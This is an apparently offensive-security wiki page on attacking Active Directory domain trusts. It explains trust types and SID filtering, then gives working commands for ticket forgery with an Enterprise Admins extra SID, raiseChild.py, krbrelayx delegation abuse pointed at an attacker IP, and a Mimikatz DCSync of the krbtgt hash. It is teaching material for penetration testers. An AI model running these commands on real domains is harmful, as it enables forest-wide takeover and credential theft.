# Trusts

## Theory

### Forest, domains & trusts

An Active Directory **domain** is a collection of computers, users, and other resources that are all managed together. A domain has its own security database, which is used to authenticate users and computers when they log in or access resources within the domain.

A **forest** is a collection of one or more Active Directory domains that share a common schema, configuration, and global catalog. The schema defines the kinds of objects that can be created within the forest, and the global catalog is a centralized database that contains a searchable, partial replica of every domain in the forest.

**Trust relationships** between domains allow users in one domain to access resources in another domain. There are several types of trust relationships that can be established, including one-way trusts, two-way trusts, external trusts, etc.&#x20;

Once a trust relationship is established between a **trusting domain** (A) and **trusted domain** (B), users from the trusted domain can authenticate to the trusting domain's resources. In other -more technical- terms, trusts extend the security boundary of a domain or forest.

### Trust types

1. **Parent-Child**: this type of trust relationship exists between a parent domain and a child domain in the same forest. The parent domain trusts the child domain, and the child domain trusts the parent domain. This type of trust is automatically created when a new child domain is created in a forest.
2. **Tree-Root**: exists between the root domain of a tree and the root domain of another tree in the same forest. This type of trust is automatically created when a new tree is created in a forest.
3. **Shortcut (a.k.a. cross-link)**: exists between two child domains of different tree (i.e. different parent domains) within the same forest. This type of trust relationship is used to reduce the number of authentication hops between distant domains. It is a one-way or two-way transitive trust.
4. **External**: exists between a domain in one forest and a domain in a different forest. It allows users in one domain to access resources in the other domain. It's usually set up when accessing resources in a forest without trust relationships established.
5. **Forest**: exists between two forests (i.e. between two root domains in their respective forest). It allows users in one forest to access resources in the other forest.
6. **Realm**: exists between a Windows domain and a non-Windows domain, such as a Kerberos realm. It allows users in the Windows domain to access resources in the non-Windows domain.

| Trust type                   | Transitivity   | Direction | Auth. mechanisms |
| ---------------------------- | -------------- | --------- | ---------------- |
| Parent-Child                 | Transitive     | Two-way   | Either           |
| Tree-Root                    | Transitive     | Two-way   | Either           |
| Shortcut (a.k.a. cross-link) | Transitive     | Either    | Either           |
| Forest                       | Transitive     | Either    | Either           |
| External                     | Non-transitive | One-way   | NTLM only        |
| Realm                        | Either         | Either    | Kerberos V5 only |

### Transitivity

In Active Directory, a transitive trust is a type of trust relationship that allows access to resources to be passed from one domain to another. When a transitive trust is established between two domains, any trusts that have been established with the first domain are automatically extended to the second domain. This means that if Domain A trusts Domain B and Domain B trusts Domain C, then Domain A automatically trusts Domain C, even if there is no direct trust relationship between Domain A and Domain C. Transitive trusts are useful in large, complex networks where multiple trust relationships have been established between many different domains. They help to simplify the process of accessing resources and reduce the number of authentication hops that may be required.

### Security boundary & SID filtering

According to Microsoft, the security boundary in Active Directory is the forest, not the domain. The forest defines the boundaries of trust and controls access to resources within the forest.

The domain is a unit within a forest and represents a logical grouping of users, computers, and other resources. Users within a domain can access resources within their own domain and can also access resources in other domains within the same forest, as long as they have the appropriate permissions. Users cannot access resources in other forests unless a trust relationship has been established between the forests.

Technically, the security boundary is enforced with SID filtering. This mechanism makes sure "only SIDs from the trusted domain will be accepted for authorization data returned during authentication. SIDs from other domains will be removed" (`netdom` cmdlet output). By default, SID filtering is disabled for intra-forest trusts, and enabled for inter-forest trusts.

Nota bene, there are two inter-forest trusts: "Forest", and "External" (see [trust types](trusts.md#trust-types)). "[Cross-forest trusts are more stringently filtered than external trusts](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)", meaning that in External trusts, SID filtering only filters out RID < 1000.

### Authentication vs. access

Simply establishing a trust relationship does not automatically grant access to resources. In order to access a "trusting" resource, a "trusted" user must have the appropriate permissions to that resource. These permissions can be granted by adding the user to a group that has access to the resource, or by giving the user explicit permissions to the resource.

A trust relationship allows users in one domain to **authenticate** to the other domain's resources, but it does not automatically grant access to them. Access to resources is controlled by permissions, which must be granted explicitly to the user in order for them to access the resources.

> In order for authentication to occur across a domain trust, the kerberos key distribution centers (KDCs) in two domains must have a shared secret, called an inter-realm key. This key is [derived from a shared password](https://msdn.microsoft.com/en-us/library/windows/desktop/aa378170\(v=vs.85\).aspx), and rotates approximately every 30 days. Parent-child domains share an inter-realm key implicitly.
>
> When a user in domain A tries to authenticate or access a resource in domain B that he has established access to, he presents his ticket-granting-ticket (TGT) and request for a service ticket to the KDC for domain A. The KDC for A determines that the resource is not in its realm, and issues the user a referral ticket.
>
> This referral ticket is a ticket-granting-ticket (TGT) encrypted with the inter-realm key shared by domain A and B. The user presents this referral ticket to the KDC for domain B, which decrypts it with the inter-realm key, checks if the user in the ticket has access to the requested resource, and issues a service ticket. This process is described in detail in [Microsoft’s documentation](https://technet.microsoft.com/en-us/library/cc772815\(v=ws.10\).aspx#w2k3tr\_kerb\_how\_pzvx) in the **Simple Cross-Realm Authentication and Examples** section.&#x20;
>
> _(by_ [_Will Schroeder_](https://twitter.com/harmj0y) _on_ [_blog.harmj0y.net_](https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/)_)_

<details>

<summary>Notes on referral tickets</summary>

From an offensive point of view, if the attacker has compromised a trusted domain (e.g. `DOMAIN1`) and targets a service (e.g. `FILESRV`) from the trusting domain (e.g. `DOMAIN2`), the following attacks could be conducted.

#### Forge an inter-realm TGT (i.e. referral ticket)

1. retrieve the inter-realm key from the trusted domain's (`DOMAIN1`) domain controller
2. use that key to forge an referral ticket (a.k.a. inter-realm TGT, a.k.a. trust ticket)
3. find a user in the trusted domain (`DOMAIN1`) that has sufficient privileges on the target service (`FILESRV`) and forge the ticket accordingly
4. present the ticket to the trusting domain's (`DOMAIN2`) domain controller, to ask for a service ticket
5. use the service ticket and access `FILESRV` as the impersonated powerful user.

#### Forge a [golden ticket](kerberos/forged-tickets/golden.md) and ask&#x20;

1. retrieve the `KRBTGT` keys from the trusted domain's (`DOMAIN1`) domain controller
2. use that to forge a golden ticket
3. find a user in the trusted domain (`DOMAIN1`) that has sufficient privileges on the target service (`FILESRV`) and forge the golden ticket accordingly
4. present the golden ticket to the trusted domain's (DOMAIN1) domain controller, and ask for a service ticket
5. the domain controller will issue an inter-realm TGT (i.e. referral ticket)
6. present the ticket to the trusting domain's (`DOMAIN2`) domain controller, to ask for a service ticket
7. use the service ticket and access `FILESRV` as the impersonated powerful user.

Forging a referral ticket using the inter-realm key, instead of relying on the krbtgt keys for a golden ticket, is a nice alternative for organizations that choose to roll their krbtgt keys, as they should.

Another scenario, that applies to both techniques, is to compromise a parent domain and to forge a ticket to act as an Enterprise Administrator, in order to gain privileged access to all child domains' domain controllers, effectively taking advantage of the automatic parent-child trust relationships.

However, none of these technique allow for a direct privilege escalation from a child to a parent domain. Another ingredient is needed (i.e. SID History).

</details>

<details>

<summary>Notes on SID history &#x26; ExtraSids</summary>

When [forging a referral ticket](trusts.md#notes-on-referral-tickets), or a golden ticket, additional security identifiers (SIDs) can be added as "extra SID" and be considered as part of the user's SID history.

* The **SID (Security Identifier)** is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.
* The **SID history** is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

If an SID in the form of `S-1-5-21-<RootDomain>-519` is added, the SID history will match the "Enterprise Admins" group of the forest root domain. Simply put, it would allow for a direct privilege escalation from any compromised domain to it's forest root, and by extension, all the forest.

This technique works for any trust relationship without SID filtering (i.e. by default, all intra-forest trusts). This technique would also work with an RID > 1000 for External trusts (e.g. `extraSid = S-1-5-21-<RootDomain>-10420`). See [security boundary and SID filtering](trusts.md#security-boundary).

</details>

## Practice

### Enumeration

Several tools can be used to enumerate trust relationships. Depending on the output, trust types and flags can be shown (see Microsoft's documentation on [trustType](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/36565693-b5e4-4f37-b0a8-c1b12138e18e?redirectedfrom=MSDN) or [trustAttributes](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN) to understand what each value implies). Among those types and flags, the following major ones must be looked for:

*   `TREAT_AS_EXTERNAL (0x00000040)`: "the trust is to be treated as external \[...]. If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering. Cross-forest trusts are more stringently filtered than external trusts. This attribute relaxes those cross-forest trusts to be equivalent to external trusts." ([Microsoft](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN))

    If this flag is set, it means a inter-forest ticket spoofing an RID >1000 can be forged. This can usually lead to the trusting domain compromise. See [security boundary & SID filtering](trusts.md#security-boundary-and-sid-filtering), and [notes on SID history & ExtraSids](trusts.md#notes-on-sid-history-and-extrasids).
* `QUARANTINED_DOMAIN (0x00000004)`: [SID filtering](trusts.md#security-boundary-and-sid-filtering) is enabled in that trust

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, tools like [ldeep](https://github.com/franc-pentest/ldeep) (Python), [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) (Python), [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) (Python) and [ldapsearch](https://git.openldap.org/openldap/openldap) (C) can be used to enumerate trusts.

<pre class="language-bash"><code class="lang-bash"><strong># ldeep supports cleartext, pass-the-hash, pass-the-ticket, etc.
</strong><strong>ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" trusts
</strong>
# ldapdomaindump will store HTML, JSON and Greppable output
ldapdomaindump --user 'DOMAIN\USER' --password "$PASSWORD" --outdir "ldapdomaindump" "$DC_HOST"

# ldapsearch-ad
ldapsearch-ad --server "$DC_HOST" --domain "$DOMAIN" --username "$USER" --password "$PASSWORD" --type trusts

# ldapsearch
ldapsearch -h ldap://"$DC_IP" -b "CN=SYSTEM,DC=$DOMAIN" "(objectclass=trustedDomain)"
</code></pre>

[BloodHound](../recon/bloodhound.md) can also be used to map the trusts. While it doesn't provide much details, it shows a visual representation.
{% endtab %}

{% tab title="Windows" %}
From Windows systems, many tools like can be used to enumerate trusts. "[A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts)" by [Will Schroeder](https://twitter.com/harmj0y) provides more in-depth guidance on how to enumerate and visually map domain trusts (in the "Visualizing Domain Trusts" section), as well as identify potential attack paths ("Foreign Relationship Enumeration" section).



## netdom

From domain-joined hosts, the `netdom` cmdlet can be used.

```batch
netdom trust /domain:DOMAIN.LOCAL
```



## PowerView

Alternatively, [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) (PowerShell) supports multiple commands for various purposes.

| Command                                                   | Alias                                                        | Description                                                                                            |
| --------------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| <pre><code><strong>Get-DomainTrust
</strong></code></pre> | <pre><code><strong>Get-NetDomainTrust
</strong></code></pre> | gets all trusts for the current user's domain                                                          |
| <pre><code>Get-ForestTrust
</code></pre>                  | <pre><code>Get-NetForestTrust
</code></pre>                  | gets all trusts for the forest associated with the current user's domain                               |
| <pre><code>Get-DomainForeignUser
</code></pre>            | <pre><code>Find-ForeignUser
</code></pre>                    | enumerates users who are in groups outside of their principal domain                                   |
| <pre><code>Get-DomainForeignGroupMember
</code></pre>     | <pre><code>Find-ForeignGroup
</code></pre>                   | enumerates all the members of a domain's groups and finds users that are outside of the queried domain |
| <pre><code>Get-DomainTrustMapping
</code></pre>           | <pre><code>Invoke-MapDomainTrust
</code></pre>               | try to build a relational mapping of all domain trusts                                                 |

> The [global catalog is a partial copy of all objects](https://technet.microsoft.com/en-us/library/cc728188\(v=ws.10\).aspx) in an Active Directory forest, meaning that some object properties (but not all) are contained within it. This data is replicated among all domain controllers marked as global catalogs for the forest. Trusted domain objects are replicated in the global catalog, so we can enumerate every single internal and external trust that all domains in our current forest have extremely quickly, and only with traffic to our current PDC.
>
> _(by_ [_Will Schroeder_](https://twitter.com/harmj0y) _on_ [_blog.harmj0y.net_](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)_)_

```powershell
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"
```

The global catalog can be found in many ways, including a simple DNS query (see [DNS recon](../recon/dns.md#finding-domain-controllers)).



## BloodHound

[BloodHound](../recon/bloodhound.md) can also be used to map the trusts. While it doesn't provide much details, it shows a visual representation.
{% endtab %}
{% endtabs %}

### Forging tickets

#### SID filtering disabled

If SID filtering is disabled in the targeted trust relationship (e.g. intra-forest trusts by default, trusts without the `QUARANTINED_DOMAIN` attribute), a ticket (inter-realm/referral ticket, or golden ticket) can be forged with an extra SID that contains the root domain and the RID of the "Enterprise Admins" group. The ticket can then be used to access the forest root domain controller and conduct a [DCSync](credentials/dumping/dcsync.md) attack.

In the case of an inter-realm ticket forgery, a service ticket request must be conducted before trying to access the domain controller. In the case of a golden ticket, the target domain controller will do that hard work. Once the last ticket is obtained, it can be used with [pass-the-ticket](kerberos/ptt.md) for the [DCSync](credentials/dumping/dcsync.md) (or any other operation).

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Impacket](https://github.com/fortra/impacket) scripts (Python) can be used for that purpose.

* ticketer.py to forge tickets
* getST.py to request service tickets
* lookupsid.py to retrieve the domains' SIDs

<pre class="language-bash" data-title="Referral ticket" data-overflow="wrap"><code class="lang-bash"><strong># 1. forge the ticket
</strong>ticketer.py -nthash "inter-realm key" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "&#x3C;root_domain_SID>-519" -spn "krbtgt/root_domain_fqdn" "someusername"
 
# 2. use it to request a service ticket
KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "root_domain_fqdn/someusername@root_domain_fqdn"
</code></pre>

{% code title="Golden ticket" overflow="wrap" %}
```bash
ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-519" "someusername"
```
{% endcode %}

Impacket's [raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) script can also be used to conduct the golden ticket technique automatically (retrieving the SIDs, dumping the child krbtgt, forging the ticket, dumping the forest root keys, etc.).

```bash
raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD" 
```
{% endtab %}

{% tab title="Windows" %}


```
```
{% endtab %}
{% endtabs %}

#### SID filtering partially enabled

If SID filtering is partially enabled, effectively filtering out RID <1000 (e.g. "External" trusts by default, or trusts with the `TREAT_AS_EXTERNAL` attribute), a ticket (inter-realm/referral ticket, or golden ticket) can be forged with an extra SID that contains the root domain and the RID of any group (with RID >1000). The ticket can then be used to conduct more attacks depending on the group privileges. In that case, the commands are the same as for [SID filtering disabled](trusts.md#sid-filtering-disabled), but the RID `519` ("Entreprise Admins" group) must be replaced with another RID >1000 of a powerful group.

{% hint style="info" %}
> &#x20;For example the Exchange security groups, which allow for a [privilege escalation to DA](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/) in many setups all have RIDs larger than 1000. Also many organisations will have custom groups for workstation admins or helpdesks that are given local Administrator privileges on workstations or servers.
>
> _(by_ [_Dirk-jan Mollema_](https://twitter.com/\_dirkjan) _on_ [_dirkjanm.io_](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)_)_
{% endhint %}

#### SID filtering enabled

If SID filtering is fully enabled (trusts with the `QUARANTINED_DOMAIN` attribute), the techniques presented above will not work since all SID that differ from the trusted domain will be filter out. This is usually the case with standard inter-forest trusts. Attackers must then fallback to other methods like abusing permissions and group memberships to move laterally from a forest to another.

## Unconstrained delegation

Unconstrained delegation can be leveraged accross domain trusts. Compromising a trusted domain allows the attacker to control the machine account of any Domain Controller, which are configured with Unconstrained Delegation by default. Any other account configured with unconstrained delegation can be used as well.

{% tabs %}
{% tab title="From the attacker machine (UNIX-like)" %}
In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its SPNs (i.e. of the compromised account) and add a DNS entry for that name.

This allows targets (e.g. Domain Controllers or Exchange servers) to authenticate back to the attacker machine.

All of this can be done from UNIX-like systems with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python).

{% hint style="info" %}
When attacking accounts able to delegate without constraints, there are two major scenarios

* **the account is a computer**: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. Since ticket received by krbrelayx will be encrypted with AES256 (by default), attackers will need to either supply the right AES256 key for the unconstrained delegations account (`--aesKey` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments).
* **the account is a user**: users can't edit their own SPNs like computers do. Attackers need to control an [account operator](../../domain-settings/builtin-groups.md) (or any other user that has the needed privileges) to edit the user's SPNs. Moreover, since tickets received by krbrelayx will be encrypted with RC4, attackers will need to either supply the NT hash (`-hashes` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments)
{% endhint %}

{% hint style="success" %}
By default, the salt is always

* **For users**: uppercase FQDN + case sensitive username = `DOMAIN.LOCALuser`
* **For computers**: uppercase FQDN + hardcoded `host` text + lowercase FQDN hostname without the trailing `$` = `DOMAIN.LOCALhostcomputer.domain.local`\
  `(using` DOMAIN.LOCAL\computer$ `account)`
{% endhint %}

```bash
# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

# 3. Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'

# 4. Authentication coercion
# PrinterBug, PetitPotam, PrivExchange, ...
```

{% hint style="warning" %}
In case, for some reason, attacking a Domain Controller doesn't work (i.e. error saying`Ciphertext integrity failed.`) try to attack others (if you're certain the credentials you supplied were correct). Some replication and propagation issues could get in the way.
{% endhint %}

Once the krbrelayx listener is ready, an [authentication coercion attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md)) can be operated. The listener will then receive a Kerberos authentication, hence a ST, containing a TGT.

The TGT will then be usable with [Pass the Ticket](../ptt.md) (to act as the victim) or with [S4U2self abuse](s4u2self-abuse.md) (to obtain local admin privileges over the victim).
{% endtab %}

{% tab title="From the compromised computer (Windows)" %}
Once the KUD capable host is compromised, [Rubeus](https://github.com/GhostPack/Rubeus) can be used (on the compromised host) as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains.

```bash
Rubeus.exe monitor /interval:5
```

Once the monitor is ready, a [forced authentication attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)) can be operated. Rubeus will then receive an authentication (hence a Service Ticket, containing a TGT). The TGT can be used to request a Service Ticket for another service.

```bash
Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt
```

Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.

Once the TGT is injected, it can natively be





&#x20;used when accessing a service, for example with [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract the `krbtgt` hash.

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```
{% endtab %}
{% endtabs %}

## ADCS

When an ADCS is installed and configured in an Active Directory environment, a CA is available for the whole forest.
Every usual ADCS attack can be executed through intra-forest trusts. [ESC8](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints) and [ESC11](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/) in particular can be used to pivot to any domain within the forest associated to the CA.

### Permissions abuse

TODO // How a domain admin of forest A could administrate a domain in forest B ? [https://social.technet.microsoft.com/Forums/windowsserver/en-US/fa4070bd-b09f-4ad2-b628-2624030c0116/forest-trust-domain-admins-to-manage-both-domains?forum=winserverDS](https://social.technet.microsoft.com/Forums/windowsserver/en-US/fa4070bd-b09f-4ad2-b628-2624030c0116/forest-trust-domain-admins-to-manage-both-domains?forum=winserverDS)

TODO // Regular permissions, ACE, and whatnot abuses, but now between foreign principals, BloodHound comes in handy.

### Group memberships

// group scoping

## Resources

{% embed url="https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/" %}

{% embed url="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" %}

{% embed url="https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/" %}

{% embed url="https://mayfly277.github.io/posts/GOADv2-pwning-part12" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)?redirectedfrom=MSDN" %}

{% embed url="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc736874(v=ws.10)" %}

{% embed url="https://blogs.msmvps.com/acefekay/tag/active-directory-trusts/" %}

{% embed url="https://adsecurity.org/?p=282" %}

{% embed url="https://adsecurity.org/?p=1640" %}

{% embed url="https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/" %}

{% embed url="https://blog.harmj0y.net/redteaming/the-trustpocalypse/" %}

{% embed url="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-2-known-ad-attacks-from-child-to-parent" %}

{% embed url="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted" %}

{% embed url="https://nored0x.github.io/red-teaming/active-directory-Trust-enumeration/" %}

{% hint style="info" %}
Parts of this page were written with the help of the [ChatGPT](https://openai.com/blog/chatgpt/) AI model.
{% endhint %}
